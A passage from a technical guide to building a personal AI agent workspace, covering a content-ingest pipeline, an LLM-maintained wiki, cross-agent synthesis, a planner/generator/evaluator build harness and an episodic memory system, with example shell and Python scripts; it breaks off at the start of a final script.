### 8A: Brain-Ingest Pipeline

#### 8A.1 Brain-Ingest — `tools/brain-ingest/brain-ingest.sh`

A pipeline that takes any URL (YouTube, articles, podcasts) and:
1. Downloads the content
2. Transcribes audio/video via Whisper
3. Extracts key claims and structured knowledge
4. Pushes to 3 targets: Obsidian vault, `memory/ingested/`, and FAISS vector index

```bash
#!/usr/bin/env bash
# brain-ingest — Extract structured knowledge from video/audio/articles
# Usage:
#   brain-ingest "https://youtube.com/watch?v=..."
#   brain-ingest --vault silverleafe --category research "URL"

set -euo pipefail

WORKSPACE="/path/to/workspace"  # ← Change
VECTOR_DIR="$WORKSPACE/tools/vector-memory"

# Map your Obsidian vaults
declare -A VAULTS=(
  ["main"]="/path/to/your/obsidian/vault"  # ← Change
)

VAULT_KEY="main"
CATEGORY="research"
INPUT=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --vault) VAULT_KEY="$2"; shift 2 ;;
    --category) CATEGORY="$2"; shift 2 ;;
    *) INPUT="$1"; shift ;;
  esac
done

VAULT_PATH="${VAULTS[$VAULT_KEY]}"

# Step 1: Download/transcribe (use yt-dlp + whisper for video, or web_fetch for articles)
# Step 2: Extract claims via LLM
# Step 3: Write to Obsidian vault
# Step 4: Write to memory/ingested/
# Step 5: Reindex vector memory

echo "brain-ingest: Processing $INPUT → $VAULT_PATH/$CATEGORY/"
# ... implement based on your content types
```

#### 8A.2 Skill File — `skills/brain-ingest/SKILL.md`

Create a skill file so the agent knows how to use brain-ingest in conversation:

```markdown
# brain-ingest Skill

## When to Use
When the user shares a URL (YouTube, article, podcast) and wants it captured in their knowledge base.

## Usage
bash tools/brain-ingest/brain-ingest.sh "URL"

## Options
- `--vault [name]` — target Obsidian vault
- `--category [name]` — subfolder in vault

## Output
- Obsidian note with frontmatter, key claims, and summary
- Copy in memory/ingested/
- Auto-reindexed in vector memory
```

### 8B: LLM Wiki — Persistent Knowledge Base (Karpathy Pattern)

Inspired by Andrej Karpathy's "llm-wiki" gist (2026). The core problem: most agents treat knowledge like RAG — re-discover from scratch on every query. Nothing accumulates. Ask a question that requires synthesizing five documents, and the agent pieces fragments together every time.

This section builds a **persistent, compounding wiki** — structured, interlinked markdown files that the agent maintains. When you add a new source, the agent doesn't just index it. It reads it, extracts key information, and **integrates it into existing wiki pages** — updating entities, revising summaries, flagging contradictions.

#### 8B.1 Three Layers

| Layer | What It Is | Who Maintains It |
|-------|-----------|------------------|
| **Raw Sources** | `memory/ingested/` — articles, papers, transcripts | Immutable. Agent reads but never modifies. |
| **The Wiki** | `memory/wiki/entities/` + `memory/wiki/concepts/` | Agent owns entirely. Creates, updates, cross-references. |
| **The Schema** | `AGENTS.md` instructions | You and the agent co-evolve. |

#### 8B.2 Wiki Structure

```
memory/wiki/
├── entities/           # People, companies, projects, tools
│   ├── exchange-building.md
│   ├── hyperliquid.md
│   ├── silverleafe.md
│   ├── openclaw.md
│   └── ...
├── concepts/           # Ideas, patterns, strategies
│   ├── agentic-memory.md
│   ├── multi-agent-coordination.md
│   ├── prompt-injection-defense.md
│   └── ...
├── index.md            # Master catalog with one-line summaries
├── log.md              # Chronological operations log
└── lint-report.md      # Latest health check results
```

Each wiki page has:
- YAML frontmatter (type, created, updated, sources, related)
- Summary section
- Details organized by topic
- Cross-references using `[[wikilinks]]` (Obsidian-compatible)
- Source history (which ingests contributed to this page)

#### 8B.3 Operations

**Ingest:** Drop a new source → agent reads it → extracts entities/concepts → updates existing wiki pages or creates new ones → updates index → appends to log. A single source can touch 10-15 wiki pages.

```bash
# Process a new source into the wiki:
bash tools/wiki/ingest-to-wiki.sh memory/ingested/2026-04-05-some-article.md
```

**Query:** Search wiki first for answers. Good answers get filed back as new wiki pages — explorations compound just like ingested sources.

**Lint:** Health-check the wiki periodically:

```bash
bash tools/wiki/lint.sh
```

Checks for:
- **Orphan pages** — wiki pages with no inbound links
- **Missing entities** — terms mentioned 3+ times but lacking their own page
- **Stale pages** — not updated in 30+ days
- **Broken cross-references** — `[[links]]` pointing to non-existent pages
- **Low-source pages** — only 1 source (weak evidence base)

#### 8B.4 Contradiction Detection

When new information arrives, check if it conflicts with existing wiki pages:

```bash
bash tools/wiki/check-contradictions.sh
```

Flags:
- Price/number claims that differ between pages
- Status claims that conflict (one page says "active", another says "blocked")
- Date claims that are inconsistent
- Stale financial data from older sources

#### 8B.5 Integration

**AGENTS.md** — Add to boot sequence:
```markdown
After ingesting new information, update relevant wiki entity/concept pages.
When answering research questions, check wiki pages first, then file good answers back.
```

**HEARTBEAT.md** — Monthly wiki lint:
```markdown
## Wiki Health Check
- Monthly: run bash tools/wiki/lint.sh
- Check for orphan pages, stale claims, missing entities
- Track in memory/heartbeat-state.json under "lastWikiLint"
```

**Obsidian** — The wiki uses `[[wikilinks]]` throughout, so opening `memory/wiki/` in Obsidian gives you a full graph view of your knowledge base with all cross-references visualized.

#### 8B.6 Key Insight

From Karpathy: *"The tedious part of maintaining a knowledge base is not the reading or the thinking — it's the bookkeeping. Updating cross-references, keeping summaries current, noting when new data contradicts old claims. Humans abandon wikis because the maintenance burden grows faster than the value. LLMs don't get bored and can touch 15 files in one pass."*

The human's job: curate sources, direct analysis, ask good questions, think about what it means.
The agent's job: everything else.

#### 8B.7 Benefits

| Before | After |
|--------|-------|
| Ingested articles sit as standalone files | Each ingest updates entity/concept pages across the wiki |
| No cross-referencing between sources | `[[wikilinks]]` connect related knowledge automatically |
| Contradictions go unnoticed | Contradiction detector flags conflicting claims |
| Stale info stays forever | Lint catches outdated pages, low-source claims |
| Knowledge scatters | Knowledge compounds — richer with every source added |
| Ask the same synthetic question repeatedly | Synthesis exists as persistent wiki pages |

---

## Phase 9: Cross-Agent Synthesis (Roundtable)

The roundtable script reads all agent outputs from the last 24 hours, extracts entities (people, companies, tickers, countries), detects cross-agent themes, and writes a daily synthesis.

### 9.1 Roundtable — `tools/roundtable.py`

Key features of the roundtable:
- Scans `shared-context/agent-outputs/` and recent `memory/` files
- Extracts entities via regex + stopword filtering (or LLM for higher quality)
- Detects contradictions across agents
- Writes synthesis to `shared-context/roundtable/latest.md`

The full implementation is ~600 lines. Core logic:

```python
#!/usr/bin/env python3
"""
Cross-Agent Synthesis (Roundtable)
Scans agent outputs, extracts entities, detects cross-agent themes.
"""

import os, re, json
from datetime import datetime, timezone, timedelta
from collections import defaultdict, Counter

SHARED_CONTEXT_DIR = "/path/to/workspace/shared-context"  # ← Change
AGENT_OUTPUTS_DIR = os.path.join(SHARED_CONTEXT_DIR, "agent-outputs")
ROUNDTABLE_DIR = os.path.join(SHARED_CONTEXT_DIR, "roundtable")
MEMORY_DIR = "/path/to/workspace/memory"  # ← Change

def scan_recent_files(hours=24):
    """Find all .md files modified in the last N hours."""
    cutoff = datetime.now(timezone.utc) - timedelta(hours=hours)
    files = []
    for search_dir in [AGENT_OUTPUTS_DIR, MEMORY_DIR]:
        for root, _, filenames in os.walk(search_dir):
            for f in filenames:
                if not f.endswith('.md'):
                    continue
                filepath = os.path.join(root, f)
                mtime = datetime.fromtimestamp(os.path.getmtime(filepath), tz=timezone.utc)
                if mtime > cutoff:
                    files.append(filepath)
    return files

def extract_entities(text):
    """Extract tickers, countries, people, amounts from text."""
    entities = {
        'tickers': re.findall(r'\$([A-Z]{2,6})', text),
        'countries': re.findall(r'\b(Kazakhstan|Uzbekistan|China|Russia|USA)\b', text),  # Extend as needed
        'amounts': re.findall(r'\$([0-9,]+(?:\.[0-9]{2})?)', text),
        'percentages': re.findall(r'([0-9.]+)%', text),
    }
    return entities

def infer_agent(filepath):
    """Infer which agent produced a file from its path."""
    # Match agent-outputs subdirectory
    match = re.search(r'agent-outputs/([^/]+)/', filepath)
    if match:
        return match.group(1)
    if '/memory/' in filepath:
        return 'main-session'
    return 'unknown'

def write_synthesis(files, all_entities):
    os.makedirs(ROUNDTABLE_DIR, exist_ok=True)
    output = os.path.join(ROUNDTABLE_DIR, "latest.md")
    
    now = datetime.now(timezone.utc)
    with open(output, 'w') as f:
        f.write(f"# Daily Roundtable — {now.strftime('%Y-%m-%d')}\n\n")
        f.write(f"**Files analyzed:** {len(files)}\n\n")
        
        f.write("## Entity Summary\n")
        for entity_type, values in all_entities.items():
            if values:
                top = Counter(values).most_common(10)
                f.write(f"**{entity_type}:** {', '.join(f'{v} ({c})' for v, c in top)}\n\n")
        
        f.write("## Sources\n")
        for filepath in files:
            agent = infer_agent(filepath)
            f.write(f"- **{agent}:** {os.path.basename(filepath)}\n")
    
    print(f"✓ Roundtable synthesis written: {output}")

if __name__ == '__main__':
    files = scan_recent_files(hours=24)
    all_entities = defaultdict(list)
    
    for filepath in files:
        with open(filepath) as f:
            text = f.read()
        entities = extract_entities(text)
        for k, v in entities.items():
            all_entities[k].extend(v)
    
    write_synthesis(files, dict(all_entities))
```

---

# Tier 4: Intelligence & Quality

---

## Phase 10: Custom Skills

Skills are instruction files that teach your agent specific capabilities. Create them in a `skills/` directory.

### Structure

```
skills/
├── [skill-name]/
│   └── SKILL.md    # Instructions the agent reads when the skill is invoked
```

### Example: Retro Skill

```markdown
# retro — Engineering Retrospective

## When to Use
Weekly or on-demand to review recent engineering work.

## Process
1. Run `git log --oneline --since="7 days ago"` to get recent commits
2. Analyze: file hotspots, LOC changes, focus score vs priorities
3. Grade focus: % of work aligned with top 3 priorities
4. Save snapshot to memory/retros/YYYY-MM-DD-retro.md

## Output
- Commit count, net LOC, dominant work areas
- Focus score (% aligned with priorities)
- Scatter score (how spread across unrelated areas)
- Recommendations for next week
```

### Registering Skills

Add skills to your OpenClaw config or place them where the agent can discover them. Reference them in AGENTS.md:

```markdown
## Tools
Skills are in the skills/ directory. When you need one, read its SKILL.md.
```

---

## Phase 11: GAN-Inspired Build Harness (Planner → Generator → Evaluator)

Single-agent builds have a ceiling. The agent builds something, evaluates its own work, praises it, and ships broken code. This phase adds a multi-agent architecture inspired by [Anthropic's harness research](https://www.anthropic.com/engineering/harness-design-long-running-apps) that separates building from judging — the same insight behind Generative Adversarial Networks.

**The core problem:** LLMs are terrible at evaluating their own work. They find bugs, then talk themselves into deciding they're not a big deal. They approve stubbed features. They call mediocre design "clean and modern." Separating the builder from the critic is the single biggest quality lever.

### 11.1 Architecture

```
┌─────────┐     spec.md      ┌───────────┐    eval-request.md    ┌───────────┐
│ PLANNER │ ──────────────── │ GENERATOR │ ──────────────────── │ EVALUATOR │
│         │                   │           │ ◄────────────────── │           │
└─────────┘                   │           │    eval-response.md  │           │
                              │  Sprint   │    contract.md       │  Reviews  │
                              │  Loop     │ ◄──────────────────  │  Contract │
                              └───────────┘                      └───────────┘
```

Three agents, three roles:
- **Planner:** Expands a 1-4 sentence prompt into a full product spec with design language
- **Generator:** Builds in sprints, one feature at a time, negotiates contracts with evaluator
- **Evaluator:** Skeptical critic that tests the live app via browser with hard pass/fail thresholds

All communication happens via files in a `.harness/` directory. One agent writes, another reads. Simple, debuggable, crash-recoverable.

### 11.2 The Evaluator — Calibrated Skepticism

The evaluator scores against 4 weighted criteria:

| Criterion | Weight | Min to Pass | What It Checks |
|-----------|--------|-------------|----------------|
| Design Quality | 30% | 5/10 | Cohesive palette, typography hierarchy, spacing rhythm, distinct mood |
| Originality | 25% | 5/10 | Custom decisions vs AI slop patterns |
| Craft | 20% | 6/10 | Font scale, spacing base unit, WCAG contrast, hover/focus states |
| Functionality | 25% | 7/10 | Every button works (not just logs), forms submit, data persists |

**Overall pass:** ALL criteria meet minimum AND weighted average >= 6.0.

The evaluator uses the browser (Playwright) to interact with the live app — it doesn't just read code. It clicks every button, fills every form, checks console after each action, and tests edge cases (empty states, overflow, mobile viewport at 375px).

#### Anti-Leniency Rules

These are baked into the evaluator's prompt to fight the natural tendency toward approval:

1. **Never use "minor issue" to dismiss a finding.** If you found it, score it.
2. **Never approve what you haven't tested.** If you can't click it, it doesn't count.
3. **Stubbed features = FAIL.** A button that logs to console instead of acting is not implemented.
4. **"It looks like it works" is not evidence.** Navigate, click, verify.
5. **Don't grade on effort.** Time spent doesn't affect the score.

#### AI Slop Blacklist

These patterns auto-deduct 3 points from the Originality score:

- Purple/violet/indigo gradient backgrounds
- The 3-column feature grid (icon-in-circle + bold title + 2-line description x 3)
- Icons in colored circles as decoration
- Everything center-aligned
- Uniform bubbly border-radius on all elements
- Decorative blobs, floating circles, wavy SVG dividers
- Generic hero copy ("Welcome to X", "Unlock the power of...")
- Emoji as design elements in headings

#### Calibration via Few-Shot Examples

Out of the box, an LLM evaluator is too generous. Calibrate with few-shot examples showing the difference:

**BAD evaluator (too lenient):**
> "The app looks great overall. There's a minor issue with the form submission but not a big deal. Clean and modern design. Score: 8/10."

**GOOD evaluator (calibrated):**
> "Form submission: FAIL. Clicking 'Save' triggers a POST to /api/items but returns 422. The error is not surfaced to the user — the button just stops responding. Console shows: 'Unhandled promise rejection: ValidationError'. This is a core flow failure. Score: 3/10 on Functionality."

Include 3-5 such examples in the evaluator's prompt covering lenient, calibrated, and over-harsh behaviors.

### 11.3 The Planner — $0.50 That Saves Hours

The planner takes a short prompt and produces a full product spec. This is the highest-ROI component — 5 minutes and $0.50 of planning prevents hours of building the wrong thing.

Planner instructions:
- **Be ambitious about scope** — feature-rich, not minimal
- **Stay high-level** — describe WHAT, not HOW (technical errors in the spec cascade into the build)
- **Create a design language** — mood, color direction, typography, layout philosophy
- **Include anti-slop guidance** — explicitly ban the blacklisted patterns
- **Weave in AI features** where they'd genuinely add value

Output: `.harness/spec.md` (product spec) + `.harness/design-language.md` (visual direction)

**Critical:** Present the spec to the human for review before building. This is the checkpoint.

### 11.4 Sprint Contracts

Before each chunk of work, the generator and evaluator negotiate what "done" looks like:

1. **Generator proposes** `.harness/contracts/sprint-01-proposal.md`:
   - Features to implement
   - Definition of done (specific, testable behaviors)
   - Verification method (how to test each criterion)

2. **Evaluator reviews** and either approves or requests changes

3. **Both agree** before any code is written

This prevents the generator from building the wrong thing or stubbing features. The contract is what the evaluator scores against — not vibes, not the spec's vague user stories.

### 11.5 Sprint vs Continuous Mode

**Sprint Mode** (for Sonnet-class models or complex builds):
- Decompose spec into 5-15 sprints
- One feature per sprint
- Context resets between sprints (clean handoff via files)
- Evaluator grades per sprint

**Continuous Mode** (for Opus-class models or simpler builds):
- Generator builds the full spec in one session
- Compaction handles context growth
- Evaluator runs 1-3 passes at the end

**Decision heuristic:** If the spec has >10 features OR you're on Sonnet, use Sprint Mode. Otherwise, Continuous.

*Note:* Anthropic found that context resets (full clean slate + structured handoff) outperform compaction for Sonnet-class models, which exhibit "context anxiety" — prematurely wrapping up as the context window fills. Opus 4.6 handles long context natively, making continuous mode viable.

### 11.6 File-Based Communication

All inter-agent communication happens via files:

```
.harness/
├── spec.md                    # Planner → full product spec
├── design-language.md         # Planner → visual direction
├── contracts/
│   ├── sprint-01-proposal.md  # Generator proposes
│   ├── sprint-01-agreed.md    # Evaluator approves
│   └── ...
├── evaluations/
│   ├── sprint-01-eval.md      # Evaluator scores + feedback
│   └── ...
├── eval-request.md            # Generator signals ready
├── eval-response.md           # Evaluator writes verdict
└── harness-log.md             # Running log
```

Why files instead of function calls or chat:
- **Debuggable:** You can read `.harness/` to understand exactly what happened
- **Crash-recoverable:** If an agent dies, the files survive for the next session
- **Auditable:** Full paper trail of every decision and score

### 11.7 Implementation Options

#### Option A: Manual Orchestration (Main Session)

You play all three roles sequentially. Read the evaluator skill, switch mental modes, test your own work with genuine skepticism. This works but requires discipline.

#### Option B: Spawn Sub-Agents

```bash
# Planner
sessions_spawn(task="[Planner prompt + spec template]", mode="run")

# Generator (after spec confirmed)
sessions_spawn(task="[Generator prompt + spec]", mode="run", cwd="/path/to/project")

# Evaluator (after generator signals ready)
sessions_spawn(task="[Evaluator prompt + contract + criteria]", mode="run")
```

Better results because the evaluator has no memory of writing the code.

#### Option C: Antfarm Workflow (Fully Autonomous)

Create a `full-build` workflow with 4 steps: plan → generate (loop) → evaluate → final_qa.

The workflow definition:

```yaml
id: full-build
name: Full Build Harness
version: 1

agents:
  - id: planner
    name: Planner
    role: analysis
  - id: generator
    name: Generator
    role: coding
  - id: evaluator
    name: Evaluator
    role: verification

steps:
  - id: plan
    agent: planner
    input: "Expand this prompt into a full product spec..."
    expects: "STATUS: done"

  - id: generate
    agent: generator
    type: loop
    loop:
      over: features
      verify_each: true
      verify_step: evaluate
      fresh_session: true
    input: "Build the next feature from the spec..."

  - id: evaluate
    agent: evaluator
    input: "Test the live app against 4 criteria..."
    on_fail:
      retry_step: generate
      max_retries: 3

  - id: final_qa
    agent: evaluator
    input: "Final pass across the complete application..."
```

Each agent gets personality files (`AGENTS.md`, `SOUL.md`) that encode their role. The evaluator's SOUL.md:

> "You are the person who finds the thing everyone else missed. You're not mean — you're honest. There's a difference. When you see a beautiful landing page, you appreciate it. Then you click the signup button and check if it actually works."

### 11.8 The Numbers

From Anthropic's benchmarks:

| Approach | Duration | Cost | Quality |
|----------|----------|------|---------|
| Solo (no harness) | 20 min | ~$9 | Core features often broken |
| Full harness (Opus 4.5) | 6 hr | ~$200 | Working, polished, feature-rich |
| Simplified harness (Opus 4.6) | 4 hr | ~$125 | Same quality, less overhead |

The harness is 10-20x more expensive. The output is categorically different — not incrementally better, but the difference between "core feature doesn't work" and "everything works, and it looks good."

### 11.9 The Key Principle

> "Every component in a harness encodes an assumption about what the model can't do on its own. Those assumptions are worth stress testing, both because they may be incorrect, and because they can quickly go stale as models improve."

Periodically strip components and test. What was needed for Sonnet 4.5 (sprint decomposition, context resets) became unnecessary on Opus 4.6. The interesting work is finding the next novel combination, not cargo-culting last month's scaffolding.

### Skill Files

Create these skills in your `skills/` directory:

**`skills/evaluator/SKILL.md`** — Full evaluator instructions with scoring rubric, anti-leniency rules, AI slop blacklist, few-shot calibration examples, and browser testing process.

**`skills/build-harness/SKILL.md`** — Orchestration pattern documentation covering all three phases, sprint contract templates, mode selection heuristics, and implementation options.

---

## Phase 12: Agentic Memory Architecture

Phases 1–11 gave your agent memory. This phase makes it *intelligent* memory.

Inspired by research on agentic memory systems (Park et al. *Generative Agents*, 2023), this phase upgrades your memory from simple storage to a curated, self-improving knowledge system with four layers: in-context, external, episodic, and semantic. The result: your agent stops re-learning old lessons, recalls *how* it solved similar problems, and automatically prunes stale context.

### The Memory Stack

| Layer | What It Stores | Our Implementation |
|-------|---------------|-------------------|
| In-context | Session state, system prompt, recent messages | AGENTS.md boot sequence, SOUL.md, USER.md |
| External | Facts, preferences, decisions | memory/*.md, decisions/*.md, QMD vector search |
| Episodic | Task outcomes, approaches, lessons | memory/episodes/ (NEW) |
| Semantic | World knowledge | Model weights (parametric) — supplemented by web search |

Phases 1–3 built the first two layers. Phase 12 adds episodic memory with importance scoring, decay-weighted recall, and automated consolidation — turning your flat file memory into a self-curating knowledge system.

### 12.1 Episodic Memory System

Episodic memory records *what happened, what worked, and what didn't* — structured task outcomes your agent can recall next time it faces something similar.

#### Directory Structure

```bash
mkdir -p memory/episodes memory/episodes/archive
```

#### Episode Schema

Each episode is a JSON file in `memory/episodes/`. One file per significant task:

```json
{
  "id": "ep-2026-04-02-deploy-fix",
  "timestamp": "2026-04-02T14:32:00-05:00",
  "title": "Fixed gateway deploy failure",
  "task_type": "debugging",
  "tags": ["gateway", "deploy", "nginx", "production"],
  "context": "Gateway failed to start after upgrading to v2.3. Nginx config had deprecated directive.",
  "approach": "Checked logs → found 'unknown directive' → searched nginx changelog → replaced deprecated ssl_protocols line.",
  "outcome": "success",
  "lesson": "Always check nginx changelog for deprecated directives before upgrading. The error message is misleading — says 'failed to bind' but the real issue is config parsing.",
  "importance": 7,
  "related_files": ["memory/2026-04-02.md"],
  "decay_anchor": "2026-04-02T14:32:00-05:00"
}
```

Field reference:

| Field | Required | Description |
|-------|----------|-------------|
| `id` | Yes | Unique slug: `ep-YYYY-MM-DD-short-desc` |
| `timestamp` | Yes | ISO 8601 with timezone |
| `title` | Yes | One-line summary |
| `task_type` | Yes | Category: `debugging`, `feature`, `research`, `config`, `conversation`, `decision` |
| `tags` | Yes | 3-6 searchable keywords |
| `context` | Yes | What was the situation? |
| `approach` | Yes | Step-by-step what was tried |
| `outcome` | Yes | `success`, `partial`, `failure` |
| `lesson` | Yes | The takeaway — what future-you should know |
| `importance` | Yes | 1-10 score (see section 12.2) |
| `related_files` | No | Links to daily notes, decisions, etc. |
| `decay_anchor` | Yes | Timestamp for recency scoring |

#### Episode Logger Script

Create `tools/episodes/log-episode.sh`:

```bash
#!/bin/bash
# Log an episode to memory/episodes/
# Usage: log-episode.sh <id> <title> <task_type> <importance> <outcome>
#   Reads context, approach, lesson from stdin (or prompts interactively)

set -euo pipefail

EPISODE_DIR="${OPENCLAW_WORKSPACE:-$(pwd)}/memory/episodes"
mkdir -p "$EPISODE_DIR"

ID="${1:?Usage: log-episode.sh <id> <title> <task_type> <importance> <outcome>}"
TITLE="${2:?Missing title}"
TASK_TYPE="${3:?Missing task_type}"
IMPORTANCE="${4:?Missing importance (1-10)}"
OUTCOME="${5:?Missing outcome (success|partial|failure)}"

TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Read multiline fields
echo "Enter context (end with Ctrl-D):"
CONTEXT=$(cat)
echo "Enter approach (end with Ctrl-D):"
APPROACH=$(cat)
echo "Enter lesson (end with Ctrl-D):"
LESSON=$(cat)

cat > "$EPISODE_DIR/$ID.json" << EOF
{
  "id": "$ID",
  "timestamp": "$TIMESTAMP",
  "title": "$TITLE",
  "task_type": "$TASK_TYPE",
  "tags": [],
  "context": $(echo "$CONTEXT" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read().strip()))'),
  "approach": $(echo "$APPROACH" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read().strip()))'),
  "outcome": "$OUTCOME",
  "lesson": $(echo "$LESSON" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read().strip()))'),
  "importance": $IMPORTANCE,
  "related_files": [],
  "decay_anchor": "$TIMESTAMP"
}
EOF

echo "Episode logged: $EPISODE_DIR/$ID.json"
```

In practice, the agent creates episodes directly by writing JSON. The script is for manual logging or cron-based extraction.

#### Agent-Side Episode Creation

Add this instruction to your `AGENTS.md` (under the Memory section):

```markdown
### Episodic Memory

After completing any significant task (debugging, feature build, research, key decision):

1. Write an episode file to `memory/episodes/ep-YYYY-MM-DD-short-desc.json`
2. Follow the episode schema (see tools/episodes/README.md)
3. Score importance honestly (see section 12.2 heuristic)
4. Include the actual lesson — not a platitude

Bad lesson: "Always test before deploying"
Good lesson: "The nginx 'failed to bind' error on port 443 actually means a config parse error when ssl_protocols contains removed values. Check with nginx -t first."
```

#### Episode Recall Script

Create `tools/episodes/recall.py`:

```python
#!/usr/bin/env python3
"""
Episode Recall — Find relevant past episodes using decay-weighted scoring.
Usage: python3 tools/episodes/recall.py "query" [--top N] [--min-score 0.3]
"""

import json, glob, sys, argparse, math
from datetime import datetime, timezone
from pathlib import Path

def load_episodes(episode_dir):
    episodes = []
    for f in glob.glob(str(Path(episode_dir) / "*.json")):
        try:
            with open(f) as fh:
                episodes.append(json.load(fh))
        except (json.JSONDecodeError, KeyError) as e:
            print(f"Skipping {f}: {e}", file=sys.stderr)
    return episodes

def text_relevance(query, episode):
    """Simple keyword overlap relevance. Replace with vector similarity for production."""
    query_terms = set(query.lower().split())
    searchable = f"{episode['title']} {episode['context']} {episode['lesson']} {' '.join(episode.get('tags', []))}"
    doc_terms = set(searchable.lower().split())
    if not query_terms:
        return 0.0
    overlap = len(query_terms & doc_terms)
    return min(overlap / len(query_terms), 1.0)

def recency_score(episode, half_life_days=30):
    """Exponential decay based on age. Half-life = 30 days by default."""
    anchor = episode.get('decay_anchor', episode['timestamp'])
    try:
        dt = datetime.fromisoformat(anchor)
    except ValueError:
        return 0.5
    now = datetime.now(timezone.utc)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    age_days = (now - dt).total_seconds() / 86400
    return math.exp(-0.693 * age_days / half_life_days)  # ln(2) = 0.693

def importance_score(episode):
    """Normalize importance to 0-1 range."""
    return min(max(episode.get('importance', 5), 1), 10) / 10.0

def weighted_score(query, episode):
    """Combined score: relevance x 0.4 + importance x 0.3 + recency x 0.3"""
    rel = text_relevance(query, episode)
    imp = importance_score(episode)
    rec = recency_score(episode)
    return (rel * 0.4) + (imp * 0.3) + (rec * 0.3)

def recall(query, episode_dir, top_n=5, min_score=0.3):
    episodes = load_episodes(episode_dir)
    scored = [(ep, weighted_score(query, ep)) for ep in episodes]
    scored.sort(key=lambda x: x[1], reverse=True)
    return [(ep, s) for ep, s in scored[:top_n] if s >= min_score]

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Recall relevant episodes')
    parser.add_argument('query', help='Search query')
    parser.add_argument('--top', type=int, default=5, help='Number of results')
    parser.add_argument('--min-score', type=float, default=0.3, help='Minimum score threshold')
    parser.add_argument('--episode-dir', default='memory/episodes', help='Episode directory')
    args = parser.parse_args()

    results = recall(args.query, args.episode_dir, args.top, args.min_score)

    if not results:
        print("No relevant episodes found.")
        sys.exit(0)

    for ep, score in results:
        print(f"\n{'='*60}")
        print(f"{ep['title']} (score: {score:.2f}, importance: {ep['importance']}/10)")
        print(f"   Type: {ep['task_type']} | Outcome: {ep['outcome']}")
        print(f"   Context: {ep['context'][:200]}")
        print(f"   Lesson: {ep['lesson']}")
```

#### QMD Vector Indexing

Episodes are plain JSON files in `memory/episodes/`, which means QMD's existing file scanner picks them up automatically if your `qmd index` command covers the `memory/` directory. For better results, create a wrapper that extracts the searchable text:

Create `tools/episodes/index-episodes.sh`:

```bash
#!/bin/bash
# Convert episodes to markdown for QMD indexing
set -euo pipefail

EPISODE_DIR="${OPENCLAW_WORKSPACE:-$(pwd)}/memory/episodes"
INDEX_FILE="${OPENCLAW_WORKSPACE:-$(pwd)}/memory/episodes/INDEX.md"

echo "# Episode Index" > "$INDEX_FILE"
echo "" >> "$INDEX_FILE"
echo "_Auto-generated. Do not edit._" >> "$INDEX_FILE"
echo "" >> "$INDEX_FILE"

for f in "$EPISODE_DIR"/*.json; do
  [ -f "$f" ] || continue
  TITLE=$(python3 -c "import json; print(json.load(open('$f'))['title'])")
  LESSON=$(python3 -c "import json; print(json.load(open('$f'))['lesson'])")
  TAGS=$(python3 -c "import json; print(', '.join(json.load(open('$f')).get('tags',[])))")
  IMPORTANCE=$(python3 -c "import json; print(json.load(open('$f'))['importance'])")
  echo "## $TITLE" >> "$INDEX_FILE"
  echo "Tags: $TAGS | Importance: $IMPORTANCE/10" >> "$INDEX_FILE"
  echo "Lesson: $LESSON" >> "$INDEX_FILE"
  echo "" >> "$INDEX_FILE"
done

echo "Indexed $(ls "$EPISODE_DIR"/*.json 2>/dev/null | wc -l | tr -d ' ') episodes → $INDEX_FILE"

# Now re-index with QMD
qmd index memory/episodes/
```

Run this after logging episodes, or wire it into a cron job (see section 12.5).

### 12.2 Importance Scoring

Not every task deserves an episode. Importance scoring acts as a **write gate** — filtering noise before it enters your episodic memory.

#### The Heuristic Scorer

Importance is scored 1-10 based on five signals:

| Signal | Weight | Description |
|--------|--------|-------------|
| Novelty | 2 pts | First time encountering this problem/pattern? |
| Impact | 3 pts | How much did it affect outcomes? (production issue = high, formatting tweak = low) |
| Reusability | 2 pts | Will this lesson apply to future tasks? |
| Difficulty | 2 pts | How hard was it to figure out? (easy answers aren't worth storing) |
| Surprise | 1 pt | Was the result unexpected? Surprises encode strong lessons |

**Scoring examples:**

| Task | Nov | Imp | Reu | Dif | Sur | Total | Log? |
|------|-----|-----|-----|-----|-----|-------|------|
| Fixed nginx config after upgrade | 2 | 2 | 2 | 1 | 1 | **8** | Yes |
| Changed button color per request | 0 | 0 | 0 | 0 | 0 | **0** | No |
| Discovered QMD timeout causes silent failures | 2 | 3 | 2 | 2 | 1 | **10** | Yes |
| Routine daily summary | 0 | 1 | 0 | 0 | 0 | **1** | No |
| New cron pattern for batch processing | 1 | 2 | 2 | 1 | 0 | **6** | Yes |

#### Write Gate

Add this rule to your `AGENTS.md`:

```markdown
### Episode Write Gate

Before logging an episode, score importance using the 5-signal heuristic:
- Novelty (0-2) + Impact (0-3) + Reusability (0-2) + Difficulty (0-2) + Surprise (0-1)
- **Threshold: 5+** → Log the episode
- **Below 5** → Skip. Not everything needs to be remembered.
- **Score 8+** → Also mention in today's daily note as a highlight
```

This keeps your episode store lean. After a month of active use, you should have 30-60 episodes, not 300. Quality over quantity.

### 12.3 Decay-Weighted Recall

Raw keyword search returns episodes by relevance alone. But a perfectly relevant episode from 6 months ago about a since-deprecated API is noise. Decay-weighted recall balances three signals:

#### The Scoring Formula

```
final_score = (relevance x 0.4) + (importance x 0.3) + (recency x 0.3)
```

Where:
- **Relevance (0-1):** Keyword overlap or vector cosine similarity between query and episode text
- **Importance (0-1):** Episode importance score normalized (divide by 10)
- **Recency (0-1):** Exponential decay with configurable half-life

```
recency = e^(-0.693 x age_days / half_life_days)
```

With a 30-day half-life:
- Today's episode: recency = 1.0
- 1 week old: recency = 0.85
- 30 days old: recency = 0.5
- 90 days old: recency = 0.125
- 180 days old: recency = 0.016

This means a 6-month-old episode needs to be *extremely* relevant and important to surface. Which is exactly what you want.

#### Tuning the Weights

The default 0.4/0.3/0.3 split works well for general use. Adjust for your workflow:

| Use Case | Relevance | Importance | Recency | Why |
|----------|-----------|------------|---------|-----|
| General | 0.4 | 0.3 | 0.3 | Balanced |
| Fast-moving codebase | 0.3 | 0.2 | 0.5 | Old episodes go stale fast |
| Research/knowledge work | 0.5 | 0.3 | 0.2 | Old insights stay valuable |
| Ops/debugging | 0.4 | 0.4 | 0.2 | Severity matters most |

#### QMD Integration Wrapper

Create `tools/episodes/smart-recall.sh` to combine QMD vector search with decay weighting:

```bash
#!/bin/bash
